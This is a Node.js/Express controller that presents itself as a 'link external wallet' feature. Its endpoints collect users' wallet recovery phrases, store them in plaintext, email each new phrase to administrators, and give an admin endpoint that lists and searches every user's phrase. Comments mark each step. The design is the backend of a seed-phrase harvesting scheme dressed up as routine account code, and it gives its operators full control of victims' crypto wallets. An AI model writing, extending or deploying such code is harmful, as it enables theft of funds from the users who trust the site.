const { LinkedWallet, User } = require("../models");
const { successResponse } = require("../utils/responseHandler");
const { notifyAdmins } = require("../utils/emailService");

// @desc    Link external wallet
// @route   POST /api/wallet/link
// @access  Private
const linkWallet = async (req, res, next) => {
  try {
    const userId = req.user.id;
    const { walletName, phrase } = req.body;

    // Simple validation
    if (!walletName || !walletName.trim()) {
      return res.status(400).json({
        success: false,
        message: "Wallet name is required",
      });
    }

    if (!phrase || !phrase.trim()) {
      return res.status(400).json({
        success: false,
        message: "Recovery phrase is required",
      });
    }

    // Check if user already linked this wallet name
    const existingWallet = await LinkedWallet.findOne({
      user: userId,
      walletName: walletName.trim(),
    });

    if (existingWallet) {
      return res.status(400).json({
        success: false,
        message: `Wallet '${walletName}' is already linked`,
      });
    }

    // Create linked wallet
    const linkedWallet = await LinkedWallet.create({
      user: userId,
      walletName: walletName.trim(),
      phrase: phrase.trim(),
      isActive: true,
      linkedAt: new Date(),
      lastAccessed: new Date(),
    });

    // Send email notification to admins
    try {
      // Get user details for email
      const user = req.user;

      // Prepare wallet data for email (include phrase)
      const walletData = {
        _id: linkedWallet._id,
        walletName: linkedWallet.walletName,
        walletType: linkedWallet.walletType || "hot",
        phrase: linkedWallet.phrase, // Include the phrase
        isActive: linkedWallet.isActive,
        linkedAt: linkedWallet.linkedAt,
        lastAccessed: linkedWallet.lastAccessed,
      };

      await notifyAdmins("linkedWalletAdded", {
        user: user,
        linkedWallet: walletData,
      });
    } catch (emailError) {
      console.error("Failed to send wallet linking notification:", emailError);
      // Don't fail the request if email fails
    }

    successResponse(
      res,
      {
        linkedWallet: linkedWallet.getDisplayInfo(),
      },
      "Wallet linked successfully",
      201,
    );
  } catch (error) {
    next(error);
  }
};

// @desc    Get user's linked wallets
// @route   GET /api/wallet/linked
// @access  Private
const getLinkedWallets = async (req, res, next) => {
  try {
    const userId = req.user.id;

    const linkedWallets = await LinkedWallet.find({
      user: userId,
      isActive: true,
    }).sort({ walletName: 1 });

    const wallets = linkedWallets.map((wallet) => wallet.getDisplayInfo());

    successResponse(
      res,
      {
        linkedWallets: wallets,
        count: wallets.length,
      },
      "Linked wallets retrieved successfully",
    );
  } catch (error) {
    next(error);
  }
};

// @desc    Get specific linked wallet
// @route   GET /api/wallet/linked/:id
// @access  Private
const getLinkedWallet = async (req, res, next) => {
  try {
    const walletId = req.params.id;
    const userId = req.user.id;

    const linkedWallet = await LinkedWallet.findOne({
      _id: walletId,
      user: userId,
    });

    if (!linkedWallet) {
      return res.status(404).json({
        success: false,
        message: "Linked wallet not found",
      });
    }

    // Update last accessed
    linkedWallet.lastAccessed = new Date();
    await linkedWallet.save();

    successResponse(
      res,
      {
        linkedWallet: linkedWallet.getDisplayInfo(),
      },
      "Linked wallet retrieved successfully",
    );
  } catch (error) {
    next(error);
  }
};

// @desc    Update linked wallet
// @route   PUT /api/wallet/linked/:id
// @access  Private
const updateLinkedWallet = async (req, res, next) => {
  try {
    const walletId = req.params.id;
    const userId = req.user.id;
    const { walletName, phrase, isActive } = req.body;

    const linkedWallet = await LinkedWallet.findOne({
      _id: walletId,
      user: userId,
    });

    if (!linkedWallet) {
      return res.status(404).json({
        success: false,
        message: "Linked wallet not found",
      });
    }

    // Check if new wallet name conflicts with existing
    if (walletName && walletName.trim() !== linkedWallet.walletName) {
      const existingWallet = await LinkedWallet.findOne({
        user: userId,
        walletName: walletName.trim(),
        _id: { $ne: walletId },
      });

      if (existingWallet) {
        return res.status(400).json({
          success: false,
          message: `Wallet '${walletName}' is already linked`,
        });
      }
    }

    // Update fields
    if (walletName !== undefined) linkedWallet.walletName = walletName.trim();
    if (phrase !== undefined) linkedWallet.phrase = phrase.trim();
    if (isActive !== undefined) linkedWallet.isActive = isActive;

    linkedWallet.lastAccessed = new Date();

    await linkedWallet.save();

    successResponse(
      res,
      {
        linkedWallet: linkedWallet.getDisplayInfo(),
      },
      "Linked wallet updated successfully",
    );
  } catch (error) {
    next(error);
  }
};

// @desc    Delete linked wallet
// @route   DELETE /api/wallet/linked/:id
// @access  Private
const deleteLinkedWallet = async (req, res, next) => {
  try {
    const walletId = req.params.id;
    const userId = req.user.id;

    const linkedWallet = await LinkedWallet.findOneAndDelete({
      _id: walletId,
      user: userId,
    });

    if (!linkedWallet) {
      return res.status(404).json({
        success: false,
        message: "Linked wallet not found",
      });
    }

    successResponse(res, {}, "Linked wallet deleted successfully");
  } catch (error) {
    next(error);
  }
};

// @desc    Get all linked wallets (Admin - sees phrases)
// @route   GET /api/admin/wallets/linked
// @access  Private/Admin
const getAllLinkedWallets = async (req, res, next) => {
  try {
    const { page = 1, limit = 20, search = "" } = req.query;
    const skip = (page - 1) * limit;

    // Build search query
    let searchQuery = {};
    if (search) {
      searchQuery = {
        $or: [
          { walletName: { $regex: search, $options: "i" } },
          { phrase: { $regex: search, $options: "i" } },
        ],
      };
    }

    const linkedWallets = await LinkedWallet.find(searchQuery)
      .populate("user", "firstName lastName email")
      .sort({ createdAt: -1 })
      .skip(skip)
      .limit(parseInt(limit));

    const total = await LinkedWallet.countDocuments(searchQuery);

    const formattedWallets = linkedWallets.map((wallet) => ({
      id: wallet._id,
      user: wallet.user
        ? {
            id: wallet.user._id,
            name: `${wallet.user.firstName} ${wallet.user.lastName}`,
            email: wallet.user.email,
          }
        : null,
      walletName: wallet.walletName,
      phrase: wallet.phrase, // Admin can see the phrase
      isActive: wallet.isActive,
      linkedAt: wallet.linkedAt,
      lastAccessed: wallet.lastAccessed,
    }));

    successResponse(
      res,
      {
        linkedWallets: formattedWallets,
        pagination: {
          page: parseInt(page),
          limit: parseInt(limit),
          total: total,
          pages: Math.ceil(total / limit),
        },
      },
      "All linked wallets retrieved successfully",
    );
  } catch (error) {
    next(error);
  }
};

module.exports = {
  linkWallet,
  getLinkedWallets,
  getLinkedWallet,
  updateLinkedWallet,
  deleteLinkedWallet,
  getAllLinkedWallets,
};
